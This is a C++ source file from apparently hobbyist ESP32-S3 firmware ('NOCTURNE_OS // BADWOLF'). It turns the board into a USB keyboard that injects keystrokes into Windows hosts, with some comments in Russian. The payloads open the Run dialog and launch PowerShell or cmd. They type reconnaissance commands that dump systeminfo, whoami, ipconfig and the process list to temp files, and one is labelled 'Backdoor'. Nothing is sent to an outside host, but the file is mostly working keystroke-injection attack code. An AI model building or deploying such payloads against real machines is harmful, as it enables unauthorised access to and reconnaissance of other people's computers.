/*
 * NOCTURNE_OS — BADWOLF USB HID: Matrix (short) and Sniffer (long) payloads.
 * Uses USB.h + USBHIDKeyboard.h (ESP32-S3 native USB). Builds on non-S3 when
 * header is missing (USB code is no-op).
 */
#include "UsbManager.h"

#if __has_include("USBHIDKeyboard.h")
#include "USB.h"
#include "USBHIDKeyboard.h"

static USBHIDKeyboard *s_keyboard = nullptr;
#define HAVE_USB_HID 1
#else
#define HAVE_USB_HID 0
#endif

UsbManager::UsbManager() {}

void UsbManager::begin() {
#if HAVE_USB_HID
  if (active_)
    return;

  // Правильный порядок инициализации для ESP32-S3
  // КРИТИЧНО: Keyboard.begin() должен быть вызван ПЕРЕД USB.begin()
  if (!s_keyboard)
    s_keyboard = new USBHIDKeyboard();

  if (!s_keyboard) {
    Serial.println("[BADWOLF] ERROR: Failed to create keyboard object");
    return;
  }

  // Сначала инициализируем HID клавиатуру
  s_keyboard->begin();
  delay(300); // Дать время на инициализацию HID

  // Теперь инициализируем USB
  USB.begin();
  delay(1000); // Увеличить задержку для стабилизации USB

  active_ = true;
  Serial.println("[BADWOLF] USB HID Keyboard ARMED.");
#else
  Serial.println("[BADWOLF] USB not supported on this board.");
#endif
}

void UsbManager::stop() {
#if HAVE_USB_HID
  if (!active_)
    return;
  if (s_keyboard) {
    s_keyboard->end();
    delete s_keyboard;
    s_keyboard = nullptr;
  }
  active_ = false;
  Serial.println("[BADWOLF] USB HID disarmed.");
#endif
}

#if HAVE_USB_HID
void UsbManager::ensureEnglishLayout() {
  if (!s_keyboard)
    return;
  s_keyboard->press(KEY_LEFT_ALT);
  s_keyboard->press(KEY_LEFT_SHIFT);
  yield(); // Allow USB HID to process key press
  s_keyboard->releaseAll();
  yield(); // Allow USB HID to process key release
}

void UsbManager::openPowerShell() {
  if (!s_keyboard)
    return;
  ensureEnglishLayout();
  yield(); // Allow USB HID to process layout change
  s_keyboard->press(KEY_LEFT_GUI);
  s_keyboard->press('r');
  s_keyboard->releaseAll();
  delay(BADWOLF_DELAY_AFTER_RUN_MS);
  s_keyboard->print("powershell");
  delay(300);
  s_keyboard->press(KEY_RETURN);
  s_keyboard->releaseAll();
  delay(BADWOLF_DELAY_AFTER_POWERSHELL_MS);
}
#endif

void UsbManager::runMatrix() {
#if HAVE_USB_HID
  if (!s_keyboard || !active_)
    return;
  openPowerShell();
  const char *msg = "NOCTURNE_OS // BADWOLF // MATRIX STALKER";
  for (size_t i = 0; msg[i]; i++) {
    s_keyboard->write((uint8_t)msg[i]);
    delay(BADWOLF_MATRIX_CHAR_DELAY_MS);
  }
  s_keyboard->press(KEY_RETURN);
  s_keyboard->releaseAll();
  Serial.println("[BADWOLF] Matrix payload sent.");
#else
  (void)0;
#endif
}

void UsbManager::runSniffer() {
#if HAVE_USB_HID
  if (!s_keyboard || !active_)
    return;
  openPowerShell();
  // Pipe systeminfo, whoami, ipconfig to temp file and open in Notepad
  const char *cmd = "systeminfo; whoami; ipconfig | Out-File -FilePath "
                    "$env:TEMP\\sniff.txt; notepad $env:TEMP\\sniff.txt";
  s_keyboard->print(cmd);
  delay(200);
  s_keyboard->press(KEY_RETURN);
  s_keyboard->releaseAll();
  Serial.println("[BADWOLF] Sniffer payload sent.");
#else
  (void)0;
#endif
}

void UsbManager::runDuckyScript(int index) {
#if HAVE_USB_HID
  if (!s_keyboard || !active_)
    return;
  switch (index) {
  case 0:
    runMatrix();
    break;
  case 1:
    runSniffer();
    break;
  case 2: {
    ensureEnglishLayout();
    delay(100);
    s_keyboard->press(KEY_LEFT_GUI);
    s_keyboard->press('r');
    s_keyboard->releaseAll();
    delay(600);
    s_keyboard->print("cmd");
    delay(200);
    s_keyboard->press(KEY_RETURN);
    s_keyboard->releaseAll();
    Serial.println("[BADWOLF] Ducky: CMD.");
    break;
  }
  case 3: {
    openPowerShell();
    s_keyboard->print(
        "Get-Process | Out-File $env:TEMP\\p.txt; notepad $env:TEMP\\p.txt");
    delay(200);
    s_keyboard->press(KEY_RETURN);
    s_keyboard->releaseAll();
    Serial.println("[BADWOLF] Ducky: Process list.");
    break;
  }
  case 4:
    runBackdoor();
    break;
  default:
    runMatrix();
    break;
  }
#else
  (void)index;
#endif
}

void UsbManager::runBackdoor() {
#if HAVE_USB_HID
  if (!s_keyboard || !active_)
    return;
  ensureEnglishLayout();
  delay(80);
  s_keyboard->press(KEY_LEFT_GUI);
  s_keyboard->press('r');
  s_keyboard->releaseAll();
  delay(500);
  s_keyboard->print("cmd");
  delay(150);
  s_keyboard->press(KEY_RETURN);
  s_keyboard->releaseAll();
  Serial.println("[BADWOLF] Backdoor (cmd) sent.");
#endif
}
